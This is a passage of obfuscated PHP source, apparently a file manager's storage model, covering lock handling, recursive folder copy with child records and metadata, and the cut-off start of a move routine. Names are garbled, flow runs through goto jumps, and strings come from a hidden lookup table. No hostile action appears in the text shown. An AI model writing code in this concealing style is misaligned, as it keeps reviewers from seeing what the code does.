goto d»”‰›ﬂ⁄ë; eç◊Ôá‹∂÷: CacheLock::setErrorMsg($dú”ƒâê›ï[154] . htmlspecialchars($C≈„ºåúêÇ[$dú”ƒâê›ï[28]]) . $dú”ƒâê›ï[472] . $Eèçò∆œè¢); $this->_lockKey($fáÑéÚÆ¥à, 1); $this->_lockKey($fáÑéÚÆ¥à, 0); goto Böüåé›â£; d»”‰›ﬂ⁄ë: $this->_lockTimeStart[$fáÑéÚÆ¥à] = timeFloat(); if (!is_array($C≈„ºåúêÇ)) { return; } $Eèçò∆œè¢ = LNG($dú”ƒâê›ï[494]); goto eç◊Ôá‹∂÷; Böüåé›â£: $A†∑¯ °⁄€ = array_reverse($this->parentLevelArray($C≈„ºåúêÇ[$dú”ƒâê›ï[455]])); foreach ($A†∑¯ °⁄€ as $fëﬁ⁄ì±„á) { $fáÑéÚÆ¥à = $b òıÉÉ˘© . $dú”ƒâê›ï[495] . $fëﬁ⁄ì±„á; if (CacheLock::lockGet($dú”ƒâê›ï[496] . $fáÑéÚÆ¥à)) { $C≈„ºåúêÇ = $this->sourceInfo($fëﬁ⁄ì±„á); CacheLock::setErrorMsg($dú”ƒâê›ï[154] . htmlspecialchars($C≈„ºåúêÇ[$dú”ƒâê›ï[28]]) . $dú”ƒâê›ï[472] . $Eèçò∆œè¢); $this->_lockKey($fáÑéÚÆ¥à, 1); $this->_lockKey($fáÑéÚÆ¥à, 0); } } goto F≥È“éˆää; F≥È“éˆää: } private function _lockCheckEnd($f–ôÍˆÔÎÀ, $eÜáüﬂ»⁄€) { goto bÇîæ†÷ç≠; A◊¯ò®ßÓ: if (!isset($this->_lockTimeStart[$C∑—ëÂßÜæ])) { return; } $cëÕñõ“Æß = timeFloat() - $this->_lockTimeStart[$C∑—ëÂßÜæ]; unset($this->_lockTimeStart[$C∑—ëÂßÜæ]); goto DÃ◊Í¿’ò±; bÇîæ†÷ç≠: $Fâ¡éâæ´ =& $_SERVER[—Ω]; $C∑—ëÂßÜæ = $f–ôÍˆÔÎÀ . $Fâ¡éâæ´[93] . $eÜáüﬂ»⁄€; CacheLock::setErrorMsg($Fâ¡éâæ´[358]); goto A◊¯ò®ßÓ; DÃ◊Í¿’ò±: if ($cëÕñõ“Æß > 0.5) { unset(self::$cacheSourceInfo[$Fâ¡éâæ´[406] . $eÜáüﬂ»⁄€]); } $a≠«◊ÉêçÃ = $this->sourceInfo($eÜáüﬂ»⁄€); if (!$a≠«◊ÉêçÃ) { show_json(LNG($Fâ¡éâæ´[102]), !1); } goto Aöé∑Î¿˜Ò; Aöé∑Î¿˜Ò: } private function _lockParent($AêŒ‹Ë≠‡ÿ, $B¥ÔÊ¡»¢«, $dåúËŒÁÑî) { if (!$this->autoLockSet) { return; } $EïßÍ·€öë = $this->sourceInfo($AêŒ‹Ë≠‡ÿ); if (!is_array($EïßÍ·€öë)) { return; } $Cº”êÊŸü€ = array_reverse($this->parentLevelArray($EïßÍ·€öë[$_SERVER[—Ω][455]])); foreach ($Cº”êÊŸü€ as $câŸàû∂€†) { $this->_lockEvent($câŸàû∂€†, $B¥ÔÊ¡»¢«, $dåúËŒÁÑî); } } private function _lockEvent($fÙ”∑ëˆŸ∫, $B€ÇüÊôÉ¢, $aÔãÓ¯Ç√ƒ) { $EÜœÏÛ•ı∑ =& $_SERVER[—Ω]; if (!$this->autoLockSet) { return; } foreach ($B€ÇüÊôÉ¢ as $dÍ∏êÓã„¢) { $dà€œ®¬äß = $dÍ∏êÓã„¢ . $EÜœÏÛ•ı∑[93] . $fÙ”∑ëˆŸ∫; if ($aÔãÓ¯Ç√ƒ && CacheLock::lockGet($EÜœÏÛ•ı∑[496] . $dà€œ®¬äß)) { continue; } $this->_lockKey($dà€œ®¬äß, $aÔãÓ¯Ç√ƒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($aÔ«ˆã“ÕÑ, $F´íÛº≠à… = 1) { $A´“ô¨è‘° = $_SERVER[—Ω][496] . md5($aÔ«ˆã“ÕÑ); if ($F´íÛº≠à…) { if (isset(self::$_lockItemArr[$A´“ô¨è‘°])) { return; } self::$_lockItemArr[$A´“ô¨è‘°] = 1; CacheLock::lock($A´“ô¨è‘°, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$A´“ô¨è‘°])) { return; } unset(self::$_lockItemArr[$A´“ô¨è‘°]); CacheLock::unlock($A´“ô¨è‘°); } } public function isParentOf($F‰∑Ÿ†©°ë, $C’‘∆‰ÀÑ¶) { goto cæ©ıÜ¬±á; cæ©ıÜ¬±á: $CÍ·‹ì‹ßË =& $_SERVER[—Ω]; $BÜàù◊ï‹‡ = $this->sourceInfo($F‰∑Ÿ†©°ë); $E†≤Íç„≤ü = $this->sourceInfo($C’‘∆‰ÀÑ¶); goto D˘ÁçôÈ∞ë; D˘ÁçôÈ∞ë: $b⁄¥âá…ü† = $BÜàù◊ï‹‡[$CÍ·‹ì‹ßË[455]] . $BÜàù◊ï‹‡[$CÍ·‹ì‹ßË[366]] . $CÍ·‹ì‹ßË[47]; $b»ê‡ºº∫› = $E†≤Íç„≤ü[$CÍ·‹ì‹ßË[455]] . $E†≤Íç„≤ü[$CÍ·‹ì‹ßË[366]] . $CÍ·‹ì‹ßË[47]; $A®∂ﬁıÖµØ = strpos($b»ê‡ºº∫›, $b⁄¥âá…ü†) === 0; goto A¿∆“û∞›Ô; A¿∆“û∞›Ô: return $A®∂ﬁıÖµØ; goto aéŒ—àÀÖŒ; aéŒ—àÀÖŒ: } private $targetIsDelete = 0; public function copy($B÷ß≈Ã‚áØ, $a©ØÕËá∑â, $CÂØ«˜ÁπÈ = REPEAT_REPLACE, $f©Ê∑ÓàøÓ = '') { goto AÏ†ˆÚøÖ›; AÏ†ˆÚøÖ›: $Dç⁄àæ√Ç‡ =& $_SERVER[—Ω]; $Cò¬∑üÕ©œ = $this->sourceInfo($B÷ß≈Ã‚áØ); $AˆëÒ°†Ô£ = $this->sourceInfo($a©ØÕËá∑â); goto EùáàÚ∞Àã; bÔÔ⁄»©”Ω: $this->saveAll($DƒÀèëÀÜà[$Dç⁄àæ√Ç‡[499]]); Model($Dç⁄àæ√Ç‡[164])->linkAdd($DƒÀèëÀÜà[$Dç⁄àæ√Ç‡[497]]); $this->folderSizeReset($a©ØÕËá∑â); goto dÓ™’»éº»; bÌ¨‘É±“è: if ($Cò¬∑üÕ©œ[$Dç⁄àæ√Ç‡[367]] == $Dç⁄àæ√Ç‡[83] && $b∑…ﬁöŸ∏π == $C™É…≥„õ≥) { $this->folderSizeResetChildren($b∑…ﬁöŸ∏π); } Model($Dç⁄àæ√Ç‡[500])->addAll($DƒÀèëÀÜà[$Dç⁄àæ√Ç‡[498]], array(), !0); if ($b∑…ﬁöŸ∏π != $C™É…≥„õ≥ || $Cò¬∑üÕ©œ[$Dç⁄àæ√Ç‡[367]] == $Dç⁄àæ√Ç‡[83]) { Model($Dç⁄àæ√Ç‡[501])->eventCopy($C™É…≥„õ≥); } goto bÔÔ⁄»©”Ω; EùáàÚ∞Àã: if (!$Cò¬∑üÕ©œ || !$AˆëÒ°†Ô£ || $AˆëÒ°†Ô£[$Dç⁄àæ√Ç‡[367]] != $Dç⁄àæ√Ç‡[83]) { return !1; } if ($this->isParentOf($B÷ß≈Ã‚áØ, $a©ØÕËá∑â)) { return !1; } $d’èΩö£¶˘ = $f©Ê∑ÓàøÓ ? $f©Ê∑ÓàøÓ : $Cò¬∑üÕ©œ[$Dç⁄àæ√Ç‡[28]]; goto BˆîïÖï’Ø; b∑ËÂˆ ˜«: $this->_childrenListClear(); $this->lockCopyEnd($B÷ß≈Ã‚áØ); $this->lockWriteEnd($a©ØÕËá∑â, $d’èΩö£¶˘); goto bÌ¨‘É±“è; BπõÁ∂õﬂã: $this->targetIsDelete = intval($Cò¬∑üÕ©œ[$Dç⁄àæ√Ç‡[393]]); $b∑…ﬁöŸ∏π = $this->fileNameExistCache($a©ØÕËá∑â, $Cò¬∑üÕ©œ[$Dç⁄àæ√Ç‡[28]]); $C™É…≥„õ≥ = $this->_copy($B÷ß≈Ã‚áØ, $a©ØÕËá∑â, $CÂØ«˜ÁπÈ, $DƒÀèëÀÜà, !0, $f©Ê∑ÓàøÓ); goto b∑ËÂˆ ˜«; dÓ™’»éº»: $this->updateModifyTime($a©ØÕËá∑â); return $C™É…≥„õ≥; goto fΩ¥– ¡ôÁ; BˆîïÖï’Ø: $this->lockCopyStart($B÷ß≈Ã‚áØ); $this->lockWriteStart($a©ØÕËá∑â, $d’èΩö£¶˘); $DƒÀèëÀÜà = array($Dç⁄àæ√Ç‡[497] => array(), $Dç⁄àæ√Ç‡[498] => array(), $Dç⁄àæ√Ç‡[499] => array()); goto BπõÁ∂õﬂã; fΩ¥– ¡ôÁ: } private function _copy($cÏ…ù†ä¶µ, $A„ôﬂìÈÈ, $E„â‹é÷íµ, &$cÛœè™∫ˆ¢, $eÑ∏¶è·‚«, $e«ºÖÃƒ‡ò = '') { goto a≤á¿·çâè; E∑Â òÀ÷ò: if (!$dèû≠©°“Ì) { return $this->_copyCreate($cÏ…ù†ä¶µ, $A„ôﬂìÈÈ, $Añ’Üï“≥œ, $cÛœè™∫ˆ¢); } $eå“≤¶ïÆ⁄ = $dèû≠©°“Ì; if ($bÇÜﬁÍì◊≤) { if ($E„â‹é÷íµ == REPEAT_RENAME_FOLDER) { $Añ’Üï“≥œ = $this->fileNameAutoCache($A„ôﬂìÈÈ, $Añ’Üï“≥œ, $E„â‹é÷íµ, $bÇÜﬁÍì◊≤); $eå“≤¶ïÆ⁄ = $this->_copyCreate($cÏ…ù†ä¶µ, $A„ôﬂìÈÈ, $Añ’Üï“≥œ, $cÛœè™∫ˆ¢); } else { $eëóä⁄Ö·ô = $this->_childrenList($cÏ…ù†ä¶µ); foreach ($eëóä⁄Ö·ô as $b∫ı§”ÃÉ‘) { $this->_copy($b∫ı§”ÃÉ‘[$FÖ‘π´ˆÖ≥[366]], $dèû≠©°“Ì, $E„â‹é÷íµ, $cÛœè™∫ˆ¢, !1); } } } else { if ($E„â‹é÷íµ == REPEAT_RENAME || $E„â‹é÷íµ == REPEAT_RENAME_FOLDER) { $Añ’Üï“≥œ = $this->fileNameAutoCache($A„ôﬂìÈÈ, $Añ’Üï“≥œ, $E„â‹é÷íµ, $bÇÜﬁÍì◊≤); $eå“≤¶ïÆ⁄ = $this->_copyCreate($cÏ…ù†ä¶µ, $A„ôﬂìÈÈ, $Añ’Üï“≥œ, $cÛœè™∫ˆ¢); } else { if ($E„â‹é÷íµ == REPEAT_REPLACE) { $AÜÆ€°≤“ß = $this->sourceInfoCache($dèû≠©°“Ì); $a÷∂ÉÁÔöÈ = $this->fileHistory($AÜÆ€°≤“ß, $C·ù‚‰ôó∂[$FÖ‘π´ˆÖ≥[415]], $C·ù‚‰ôó∂[$FÖ‘π´ˆÖ≥[77]]); if ($a÷∂ÉÁÔöÈ) { $cÛœè™∫ˆ¢[$FÖ‘π´ˆÖ≥[497]][] = $C·ù‚‰ôó∂[$FÖ‘π´ˆÖ≥[415]]; } } else { if ($E„â‹é÷íµ == REPEAT_SKIP) { } } } Hook::trigger($FÖ‘π´ˆÖ≥[502], array($FÖ‘π´ˆÖ≥[503], $C·ù‚‰ôó∂, 0)); } goto e®ı˘‰È÷â; e®ı˘‰È÷â: return $eå“≤¶ïÆ⁄; goto bÖÑæ›ø≠ä; C∫˘ı„≤Èú: $Añ’Üï“≥œ = $e«ºÖÃƒ‡ò ? $e«ºÖÃƒ‡ò : $C·ù‚‰ôó∂[$FÖ‘π´ˆÖ≥[28]]; $dèû≠©°“Ì = $this->fileNameExistCache($A„ôﬂìÈÈ, $Añ’Üï“≥œ); if ($eÑ∏¶è·‚«) { $this->_childrenAllMake($cÏ…ù†ä¶µ); if ($bÇÜﬁÍì◊≤ && $dèû≠©°“Ì) { $this->_childrenAllMake($dèû≠©°“Ì); } } goto E∑Â òÀ÷ò; a≤á¿·çâè: $FÖ‘π´ˆÖ≥ =& $_SERVER[—Ω]; $C·ù‚‰ôó∂ = $this->sourceInfoCache($cÏ…ù†ä¶µ); $bÇÜﬁÍì◊≤ = $C·ù‚‰ôó∂[$FÖ‘π´ˆÖ≥[367]] == $FÖ‘π´ˆÖ≥[83]; goto C∫˘ı„≤Èú; bÖÑæ›ø≠ä: } private function _copyCreate($dïÌü∫·ËÊ, $f›àª®¥©‡, $D∂§≤∑ìÿ≥, &$cà÷πËª…á) { goto bîÉûÖ¯ÚÏ; bîÉûÖ¯ÚÏ: $FÖ¯Ó££Üó =& $_SERVER[—Ω]; $dö‰Ó”ùÇß = $this->sourceInfoCache($dïÌü∫·ËÊ); $CÌéÉßŸàÇ = $this->sourceInfoCache($f›àª®¥©‡); goto F◊∞ÀÎ†œë; B¿‡•∫†‰Ò: $aµ≈∂◊¢†≥ = $this->add($eíÔè‹Ω…®); $Dô∫ßñÂé = array($FÖ¯Ó££Üó[366] => $aµ≈∂◊¢†≥, $FÖ¯Ó££Üó[28] => $D∂§≤∑ìÿ≥); $this->_copyApplyMeta($Dô∫ßñÂé, $cà÷πËª…á); goto Bå¯ñäï±˜; C°≈ù’¬ù§: $this->chunkEventSet($FÖ¯Ó££Üó[511], array($FÖ¯Ó££Üó[512], $eíÔè‹Ω…®, $Cõﬁª„Óãã)); $this->saveAll($d‡—‹£¯ÜÔ); return $aµ≈∂◊¢†≥; goto bˆ®ä—Õ‡€; FÃ»ΩÖïÌè: $this->addAll($aÑ‚ä»é¢µ, array(), !1); $aôÇÿæ◊âä = $this->where(array($FÖ¯Ó££Üó[457] => $aµ≈∂◊¢†≥))->select(); $eéì”„ÔÇÛ = $this->_childrenMakeRelation($bç∏à∆äŒÉ, $aôÇÿæ◊âä); goto A±è¥ﬂ⁄«ó; F◊∞ÀÎ†œë: $eíÔè‹Ω…® = $this->_makeItemData($dö‰Ó”ùÇß, $CÌéÉßŸàÇ, $D∂§≤∑ìÿ≥); Hook::trigger($FÖ¯Ó££Üó[504], $eíÔè‹Ω…®); Hook::trigger($FÖ¯Ó££Üó[505], array($FÖ¯Ó££Üó[506], $eíÔè‹Ω…®, 0)); goto B¿‡•∫†‰Ò; Aï¿éî˜å‡: $this->_childrenListAll($dïÌü∫·ËÊ, $bç∏à∆äŒÉ); $Cõﬁª„Óãã = count($bç∏à∆äŒÉ); if ($Cõﬁª„Óãã == 0) { return $aµ≈∂◊¢†≥; } goto bŒ’Öò∑ªÁ; A±è¥ﬂ⁄«ó: $eéì”„ÔÇÛ[$dïÌü∫·ËÊ] = $aµ≈∂◊¢†≥; $dáÑÇ§ˆ∏Œ = array(); $d‡—‹£¯ÜÔ = array(); goto Dû˜ç⁄ÊËæ; bŒ’Öò∑ªÁ: $dãœªÆæØ‰ = $this->sourceInfo($aµ≈∂◊¢†≥); foreach ($bç∏à∆äŒÉ as $BßÈàáÌƒñ) { $B©ÖÆˆ≠ò† = $this->_makeItemData($BßÈàáÌƒñ, $dãœªÆæØ‰, $BßÈàáÌƒñ[$FÖ¯Ó££Üó[28]]); $B©ÖÆˆ≠ò†[$FÖ¯Ó££Üó[455]] = $BßÈàáÌƒñ[$FÖ¯Ó££Üó[455]]; $aÑ‚ä»é¢µ[] = $B©ÖÆˆ≠ò†; } $this->chunkEventSet($FÖ¯Ó££Üó[507], array($FÖ¯Ó££Üó[508], $eíÔè‹Ω…®, $Cõﬁª„Óãã)); goto FÃ»ΩÖïÌè; Bå¯ñäï±˜: if ($dö‰Ó”ùÇß[$FÖ¯Ó££Üó[367]] != $FÖ¯Ó££Üó[83]) { $cà÷πËª…á[$FÖ¯Ó££Üó[497]][] = $dö‰Ó”ùÇß[$FÖ¯Ó££Üó[415]]; return $aµ≈∂◊¢†≥; } $bç∏à∆äŒÉ = array(); $aÑ‚ä»é¢µ = array(); goto Aï¿éî˜å‡; Dû˜ç⁄ÊËæ: foreach ($aôÇÿæ◊âä as $BßÈàáÌƒñ) { $CØÇÑ¬öÚ∂ = $BßÈàáÌƒñ[$FÖ¯Ó££Üó[366]]; $aû«≠πœ¨ï = $this->_childrenMatch($eéì”„ÔÇÛ, $BßÈàáÌƒñ, $dãœªÆæØ‰); $dáÑÇ§ˆ∏Œ[] = array($FÖ¯Ó££Üó[366], $CØÇÑ¬öÚ∂, $FÖ¯Ó££Üó[457], $aû«≠πœ¨ï[$FÖ¯Ó££Üó[457]]); $d‡—‹£¯ÜÔ[] = array($FÖ¯Ó££Üó[366], $CØÇÑ¬öÚ∂, $FÖ¯Ó££Üó[455], $aû«≠πœ¨ï[$FÖ¯Ó££Üó[455]]); $this->_copyApplyMeta($BßÈàáÌƒñ, $cà÷πËª…á); if ($BßÈàáÌƒñ[$FÖ¯Ó££Üó[367]] != $FÖ¯Ó££Üó[83]) { $cà÷πËª…á[$FÖ¯Ó££Üó[497]][] = $BßÈàáÌƒñ[$FÖ¯Ó££Üó[415]]; } } $this->chunkEventSet($FÖ¯Ó££Üó[509], array($FÖ¯Ó££Üó[510], $eíÔè‹Ω…®, $Cõﬁª„Óãã)); $this->saveAll($dáÑÇ§ˆ∏Œ); goto C°≈ù’¬ù§; bˆ®ä—Õ‡€: } private function _childrenMakeRelation($bÍî‹≠œè…, $EŸìá¨í´î) { $CÔ Ê±Ö =& $_SERVER[—Ω]; $eè∞–áé…´ = array(); $E÷âêÓ‡Ú¶ = array(); foreach ($bÍî‹≠œè… as $FñÑç≥é∑…) { $Fä°’√ıà¢ = $FñÑç≥é∑…[$CÔ Ê±Ö[28]] . $CÔ Ê±Ö[8] . $FñÑç≥é∑…[$CÔ Ê±Ö[455]]; $eè∞–áé…´[$Fä°’√ıà¢] = $FñÑç≥é∑…[$CÔ Ê±Ö[366]]; } foreach ($EŸìá¨í´î as $FñÑç≥é∑…) { $Fä°’√ıà¢ = $FñÑç≥é∑…[$CÔ Ê±Ö[28]] . $CÔ Ê±Ö[8] . $FñÑç≥é∑…[$CÔ Ê±Ö[455]]; $aÒÌ‘‰¿Œ’ = $eè∞–áé…´[$Fä°’√ıà¢]; $E÷âêÓ‡Ú¶[$aÒÌ‘‰¿Œ’] = $FñÑç≥é∑…[$CÔ Ê±Ö[366]]; } return $E÷âêÓ‡Ú¶; } private function _childrenMatch($FˆÒü«Õéä, $fÖÓôØ£ŸÎ, $E„ëÏà€È≈) { goto DÏ…ò∆±´«; C˘¬Î∞∑úÖ: $f›¿»≤óÇô = $cõ‘‘◊√–à[count($cõ‘‘◊√–à) - 1]; return array($cŒâ»—≠Ô…[457] => $f›¿»≤óÇô, $cŒâ»—≠Ô…[455] => $DÕëÀãµ—∞); goto bÚåÏ‹øÑº; DÏ…ò∆±´«: $cŒâ»—≠Ô… =& $_SERVER[—Ω]; $DÕëÀãµ—∞ = $E„ëÏà€È≈[$cŒâ»—≠Ô…[455]]; $Eà‡ƒﬂÖº· = $this->parentLevelArray($fÖÓôØ£ŸÎ[$cŒâ»—≠Ô…[455]]); goto cÓ®™ôçâ∞; cÓ®™ôçâ∞: foreach ($Eà‡ƒﬂÖº· as $CÊ—’‡’Î¡) { if (isset($FˆÒü«Õéä[$CÊ—’‡’Î¡])) { $DÕëÀãµ—∞ .= $FˆÒü«Õéä[$CÊ—’‡’Î¡] . $cŒâ»—≠Ô…[513]; } } $DÕëÀãµ—∞ = rtrim($DÕëÀãµ—∞, $cŒâ»—≠Ô…[47]) . $cŒâ»—≠Ô…[47]; $cõ‘‘◊√–à = $this->parentLevelArray($DÕëÀãµ—∞); goto C˘¬Î∞∑úÖ; bÚåÏ‹øÑº: } private function _makeItemData($bóŸ¬óÂñÖ, $b◊ˆíáéº¨, $f£˜Ö∂ã–…) { $c„•ãÊÁ∑á =& $_SERVER[—Ω]; $EÃíˆßôÀ¯ = array($c„•ãÊÁ∑á[514] => $bóŸ¬óÂñÖ[$c„•ãÊÁ∑á[367]], $c„•ãÊÁ∑á[383] => $f£˜Ö∂ã–…, $c„•ãÊÁ∑á[515] => $bóŸ¬óÂñÖ[$c„•ãÊÁ∑á[369]], $c„•ãÊÁ∑á[416] => $bóŸ¬óÂñÖ[$c„•ãÊÁ∑á[415]], $c„•ãÊÁ∑á[516] => $bóŸ¬óÂñÖ[$c„•ãÊÁ∑á[77]], $c„•ãÊÁ∑á[517] => $b◊ˆíáéº¨[$c„•ãÊÁ∑á[368]], $c„•ãÊÁ∑á[518] => $b◊ˆíáéº¨[$c„•ãÊÁ∑á[452]], $c„•ãÊÁ∑á[519] => USER_ID, $c„•ãÊÁ∑á[520] => USER_ID, $c„•ãÊÁ∑á[365] => $b◊ˆíáéº¨[$c„•ãÊÁ∑á[366]], $c„•ãÊÁ∑á[521] => $b◊ˆíáéº¨[$c„•ãÊÁ∑á[455]] . $b◊ˆíáéº¨[$c„•ãÊÁ∑á[366]] . $c„•ãÊÁ∑á[47], $c„•ãÊÁ∑á[392] => 0, $c„•ãÊÁ∑á[522] => $c„•ãÊÁ∑á[33]); return $EÃíˆßôÀ¯; } private function _copyApplyMeta($cÀÃáêáôï, &$Bæ≈•ø…öë) { $bÖí‚’™Î¥ =& $_SERVER[—Ω]; $DÖåç“˘ß = $cÀÃáêáôï[$bÖí‚’™Î¥[366]]; $A≤ã¬•Èç = $cÀÃáêáôï[$bÖí‚’™Î¥[28]]; if (!isset($cÀÃáêáôï[$bÖí‚’™Î¥[523]]) || !$cÀÃáêáôï[$bÖí‚’™Î¥[523]] || $cÀÃáêáôï[$bÖí‚’™Î¥[523]] == $bÖí‚’™Î¥[464]) { $Bæ≈•ø…öë[$bÖí‚’™Î¥[499]][] = array($bÖí‚’™Î¥[366], $DÖåç“˘ß, $bÖí‚’™Î¥[523], short_id($DÖåç“˘ß)); } if (Input::check($A≤ã¬•Èç, $bÖí‚’™Î¥[524])) { $Bæ≈•ø…öë[$bÖí‚’™Î¥[498]][] = array($bÖí‚’™Î¥[366] => $DÖåç“˘ß, $bÖí‚’™Î¥[89] => $bÖí‚’™Î¥[412], $bÖí‚’™Î¥[356] => str_replace($bÖí‚’™Î¥[50], $bÖí‚’™Î¥[33], Pinyin::encode($A≤ã¬•Èç))); $Bæ≈•ø…öë[$bÖí‚’™Î¥[498]][] = array($bÖí‚’™Î¥[366] => $DÖåç“˘ß, $bÖí‚’™Î¥[89] => $bÖí‚’™Î¥[411], $bÖí‚’™Î¥[356] => Pinyin::encode($A≤ã¬•Èç, $bÖí‚’™Î¥[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($F‰Á∂é∏æä) { goto FÙìë…©¶ò; A≈ﬁ÷ßúö≠: $bã≠é„“÷´ = array($EÖ˘È–¨Ùÿ[455] => array($EÖ˘È–¨Ùÿ[479], $B’â⁄ÁÔßÃ[$EÖ˘È–¨Ùÿ[455]] . $F‰Á∂é∏æä . $EÖ˘È–¨Ùÿ[480]), $EÖ˘È–¨Ùÿ[393] => $this->targetIsDelete); $BëÍé•‚ê‘ = $this->field($B„üŒ≈å†∏)->where($bã≠é„“÷´)->select(); if (!$BëÍé•‚ê‘) { return; } goto C´µ≤ËëÁı; C´µ≤ËëÁı: $BëÍé•‚ê‘ = array_to_keyvalue($BëÍé•‚ê‘, $EÖ˘È–¨Ùÿ[366]); foreach ($BëÍé•‚ê‘ as $BÌÿàüäªü) { $FÀáµîªÉÆ = $BÌÿàüäªü[$EÖ˘È–¨Ùÿ[457]]; $F‰Á∂é∏æä = $BÌÿàüäªü[$EÖ˘È–¨Ùÿ[366]]; if (!isset($this->_childrenListCache[$F‰Á∂é∏æä]) && $BÌÿàüäªü[$EÖ˘È–¨Ùÿ[367]] == $EÖ˘È–¨Ùÿ[83]) { $this->_childrenListCache[$F‰Á∂é∏æä] = array(); } if (!isset($this->_childrenListCache[$FÀáµîªÉÆ])) { $this->_childrenListCache[$FÀáµîªÉÆ] = array(); } $this->_childrenListCache[$FÀáµîªÉÆ][$F‰Á∂é∏æä] = $BÌÿàüäªü; $this->_childrenItemCache[$F‰Á∂é∏æä] = $BÌÿàüäªü; } goto dÓ˘œÉÈò…; FÙìë…©¶ò: $EÖ˘È–¨Ùÿ =& $_SERVER[—Ω]; $B’â⁄ÁÔßÃ = $this->sourceInfo($F‰Á∂é∏æä); $B„üŒ≈å†∏ = $EÖ˘È–¨Ùÿ[526]; goto A≈ﬁ÷ßúö≠; dÓ˘œÉÈò…: } private function _childrenListAll($cùòë†ØÍë, &$eƒûµ÷ÉàÙ) { $Fäƒ»ÁÒ¡ê =& $_SERVER[—Ω]; if (!isset($this->_childrenListCache[$cùòë†ØÍë])) { return; } $AıûÑß°Óí = $this->_childrenListCache[$cùòë†ØÍë]; foreach ($AıûÑß°Óí as $a®ì‰åÆ¬© => $f¨ıπﬁ»÷Ò) { $eƒûµ÷ÉàÙ[$a®ì‰åÆ¬©] = $f¨ıπﬁ»÷Ò; if ($f¨ıπﬁ»÷Ò[$Fäƒ»ÁÒ¡ê[367]] == $Fäƒ»ÁÒ¡ê[83]) { $this->_childrenListAll($a®ì‰åÆ¬©, $eƒûµ÷ÉàÙ); } } } private function sourceInfoCache($fâ≤»ÿáà) { if (isset($this->_childrenItemCache[$fâ≤»ÿáà])) { return $this->_childrenItemCache[$fâ≤»ÿáà]; } return $this->sourceInfo($fâ≤»ÿáà); } private function _childrenList($AÆÿÜ÷æÿ™) { if (isset($this->_childrenListCache[$AÆÿÜ÷æÿ™])) { return $this->_childrenListCache[$AÆÿÜ÷æÿ™]; } return $this->_childrenListSelect($AÆÿÜ÷æÿ™); } private function _childrenListSelect($F±ÕﬁÁ∞¡Œ) { goto B√π £≥ñç; b©âÀÁœÁƒ: foreach ($c¢¶ é Ë≤ as $F±ÕﬁÁ∞¡Œ => $dﬁÌ¬é‚“„) { $this->_childrenItemCache[$F±ÕﬁÁ∞¡Œ] = $dﬁÌ¬é‚“„; } return $c¢¶ é Ë≤; goto aú©‚£ÏÉÿ; dÀ≈Õ∏ÿ⁄—: $f Œä–´Ëº = $f Œä–´Ëº ? $f Œä–´Ëº : array(); $c¢¶ é Ë≤ = array_to_keyvalue($f Œä–´Ëº, $b›ºÍìÂ≤ã[366]); $this->_childrenListCache[$F±ÕﬁÁ∞¡Œ] = $c¢¶ é Ë≤; goto b©âÀÁœÁƒ; B√π £≥ñç: $b›ºÍìÂ≤ã =& $_SERVER[—Ω]; $d±≥Ωò˘¯º = array($b›ºÍìÂ≤ã[457] => $F±ÕﬁÁ∞¡Œ, $b›ºÍìÂ≤ã[393] => $this->targetIsDelete); $f Œä–´Ëº = $this->where($d±≥Ωò˘¯º)->select(); goto dÀ≈Õ∏ÿ⁄—; aú©‚£ÏÉÿ: } private function fileNameExistCache($c¨ıú—Î÷Ì, $AΩ±‘‹‹≈ä) { $eõÎ≥ùÆé„ =& $_SERVER[—Ω]; $AΩ±‘‹‹≈ä = strtolower($AΩ±‘‹‹≈ä); $cŸçîûäØã = $this->_childrenList($c¨ıú—Î÷Ì); foreach ($cŸçîûäØã as $AòË‚ó¨≥Œ) { if ($AΩ±‘‹‹≈ä == strtolower($AòË‚ó¨≥Œ[$eõÎ≥ùÆé„[28]])) { return $AòË‚ó¨≥Œ[$eõÎ≥ùÆé„[366]]; } } return !1; } private function fileNameAutoCache($aêÑ›ô’Æº, $bÊ”»ÿëˆÔ, $F‹ÚïØÀ∞ç, $bà©ú··‘∫) { $DÉ¯˘ñ≤˘Ù =& $_SERVER[—Ω]; $C™ö∏Ì®ÏÜ = $this->_childrenList($aêÑ›ô’Æº); $e’ﬂù›èâ  = array_to_keyvalue($C™ö∏Ì®ÏÜ, $DÉ¯˘ñ≤˘Ù[33], $DÉ¯˘ñ≤˘Ù[28]); return $this->fileNameAutoGet($e’ﬂù›èâ , $bÊ”»ÿëˆÔ, $F‹ÚïØÀ∞ç, $bà©ú··‘∫); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($e…ÜÛ°Ö≥æ, $FÜÜÌÉ≤∑ë, $Bº—ÙÊ¯ˆÂ = REPEAT_REPLACE, $EÇÓË„◊©≥ = '') { goto BŸä‚–˜ê≈; fó›ü‹Â∫æ: Model($Cœœ∫—Ø⁄ [164])->linkAdd($aôÔÛ™¡€‹[$Cœœ∫—Ø⁄ [497]]); if ($b£⁄´ŒôåÖ && $aôÔÛ™¡€‹[$Cœœ∫—Ø⁄ [529]]) { $this->removeNow($e…ÜÛ°Ö≥æ, !1); } $this->lockMoveEnd($e…ÜÛ°Ö≥æ); goto AæÀ≈Ú£Ë°; bú™Ü›Ø›»: $dÓèàªÿîí = $EÇÓË„◊©≥ ? $EÇÓË„◊©≥ : $D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [28]]; $this->lockMoveStart($e…ÜÛ°Ö≥æ); $this->lockWriteStart($FÜÜÌÉ≤∑ë, $dÓèàªÿîí); goto aî∑œ’•¬≈; aî∑œ’•¬≈: $aôÔÛ™¡€‹ = array($Cœœ∫—Ø⁄ [497] => array(), $Cœœ∫—Ø⁄ [529] => !1); $this->clearShare($e…ÜÛ°Ö≥æ, $FÜÜÌÉ≤∑ë); $b£⁄´ŒôåÖ = $this->fileNameExistCache($FÜÜÌÉ≤∑ë, $D¶Ö¯é´≈ƒ[$Cœœ∫—Ø⁄ [28]]); goto cÖÑ·åıêä; BŸä‚–˜ê≈: $Cœœ∫—Ø⁄  =& $_SERVER[—Ω]; $D¶Ö¯é´≈ƒ = $this->sourceInfo($e…ÜÛ°Ö≥æ); $aøﬁ£»ÜõË = $this->sourceInfo($FÜÜÌÉ≤∑ë); goto b∂øê’ë™ˆ; CãœÇ¨ÂŸœ: Model($Cœœ∫—Ø⁄ [501])->eventMove($e…ÜÛ°Ö≥æ, 